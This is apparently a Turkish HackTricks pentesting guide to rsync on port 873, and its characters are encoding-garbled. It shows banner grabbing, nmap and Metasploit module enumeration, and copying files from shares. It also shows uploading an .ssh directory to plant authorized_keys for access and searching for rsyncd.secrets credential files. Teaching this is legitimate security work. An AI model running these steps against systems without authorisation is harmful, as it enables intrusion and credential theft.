# 873 - Rsync Pentest

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## **Temel Bilgiler**

[wikipedia](https://en.wikipedia.org/wiki/Rsync)'dan alÄ±nan bilgilere gÃ¶re:

> **rsync**, bir bilgisayar ile harici bir sabit disk arasÄ±nda ve aÄŸ Ã¼zerindeki bilgisayarlar arasÄ±nda [dosya](https://en.wikipedia.org/wiki/Computer_file) [aktarma](https://en.wikipedia.org/wiki/File_transfer) ve [senkronizasyon](https://en.wikipedia.org/wiki/File_synchronization) iÅŸlemlerini verimli bir ÅŸekilde gerÃ§ekleÅŸtiren bir yardÄ±mcÄ± programdÄ±r. Bu iÅŸlem, dosyalarÄ±n [deÄŸiÅŸtirme zamanlarÄ±nÄ±](https://en.wikipedia.org/wiki/Timestamping_(computing)) ve boyutlarÄ±nÄ± karÅŸÄ±laÅŸtÄ±rarak yapÄ±lÄ±r.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3) Genellikle [Unix benzeri](https://en.wikipedia.org/wiki/Unix-like) [iÅŸletim sistemlerinde](https://en.wikipedia.org/wiki/Operating_system) bulunur. Rsync algoritmasÄ±, bir tÃ¼r [delta kodlama](https://en.wikipedia.org/wiki/Delta_encoding) kullanÄ±r ve aÄŸ kullanÄ±mÄ±nÄ± en aza indirmek iÃ§in kullanÄ±lÄ±r. Ek olarak [veri sÄ±kÄ±ÅŸtÄ±rma](https://en.wikipedia.org/wiki/Data_compression) iÃ§in [Zlib](https://en.wikipedia.org/wiki/Zlib) kullanÄ±labilir,[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3) ve gÃ¼venlik iÃ§in [SSH](https://en.wikipedia.org/wiki/Secure_Shell) veya [stunnel](https://en.wikipedia.org/wiki/Stunnel) kullanÄ±labilir.

**VarsayÄ±lan port:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## NumaralandÄ±rma

### Banner ve El ile Ä°letiÅŸim

Rsync, bir aÄŸ servisi olduÄŸu iÃ§in, hedef sistemde Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda bir banner dÃ¶ndÃ¼rÃ¼r. Bu banner, hedef sistem hakkÄ±nda bazÄ± bilgiler saÄŸlayabilir. Rsync sunucusuna baÄŸlanarak banner'Ä± alabilirsiniz:

```bash
$ nc <hedef_ip> 873
```

Banner'Ä± almak iÃ§in `nc` (netcat) aracÄ±nÄ± kullanÄ±yoruz. Banner, hedef sistemde Ã§alÄ±ÅŸan Rsync sÃ¼rÃ¼mÃ¼nÃ¼ ve diÄŸer bilgileri iÃ§erebilir.

AyrÄ±ca, Rsync sunucusuyla el ile iletiÅŸim kurabilirsiniz. Rsync sunucusuna baÄŸlanmak iÃ§in `rsync` komutunu kullanabilirsiniz:

```bash
$ rsync <hedef_ip>::
```

Bu komut, sunucudaki mevcut modÃ¼lleri listeler. ModÃ¼ller, Rsync sunucusunda paylaÅŸÄ±lan dizinlerdir. Bu dizinlere eriÅŸim saÄŸlayarak verilere eriÅŸebilirsiniz.
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **PaylaÅŸÄ±lan KlasÃ¶rleri SÄ±ralama**

**Rsync modÃ¼lleri**, **ÅŸifrelerle korunmuÅŸ olabilecek** **dizin paylaÅŸÄ±mlarÄ±** olarak tanÄ±mlanÄ±r. KullanÄ±labilir modÃ¼lleri belirlemek ve ÅŸifre gerekip gerekmediÄŸini kontrol etmek iÃ§in aÅŸaÄŸÄ±daki komutlar kullanÄ±lÄ±r:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Dikkatli olun, bazÄ± paylaÅŸÄ±mlar liste iÃ§inde gÃ¶rÃ¼nmeyebilir ve gizlenebilir. AyrÄ±ca, bazÄ± paylaÅŸÄ±mlara eriÅŸim belirli kimlik bilgilerine kÄ±sÄ±tlÄ± olabilir ve "EriÅŸim Engellendi" mesajÄ±yla belirtilir.

### [**Brute Force**](../generic-methodologies-and-resources/brute-force.md#rsync)

### Rsync KullanÄ±mÄ±

Bir **modÃ¼l listesi** elde ettikten sonra, iÅŸlemler kimlik doÄŸrulamasÄ± gerekip gerekmediÄŸine baÄŸlÄ± olarak deÄŸiÅŸir. Kimlik doÄŸrulamasÄ± olmadan, paylaÅŸÄ±lan bir klasÃ¶rden dosyalarÄ±n **listelenmesi** ve **kopyalanmasÄ±**, yerel bir dizine ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilir:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Bu iÅŸlem, dosyalarÄ± Ã¶zelliklerini ve izinlerini koruyarak **rekÃ¼rsif olarak aktarÄ±r**.

**Kimlik bilgileri** ile paylaÅŸÄ±lan bir klasÃ¶rden listeleyip indirme iÅŸlemi aÅŸaÄŸÄ±daki gibi yapÄ±labilir, burada bir ÅŸifre isteme ekranÄ± gÃ¶rÃ¼necektir:
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Ä°Ã§erik yÃ¼klemek iÃ§in, eriÅŸim iÃ§in bir **authorized_keys** dosyasÄ± gibi, ÅŸunu kullanÄ±n:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Rsyncd yapÄ±landÄ±rma dosyasÄ±nÄ± bulmak iÃ§in ÅŸunu Ã§alÄ±ÅŸtÄ±rÄ±n:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
Bu dosyada, bir _secrets dosyasÄ±_ parametresi rsyncd kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±cÄ± adlarÄ± ve ÅŸifreler iÃ§eren bir dosyaya iÅŸaret edebilir.


## Referanslar
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
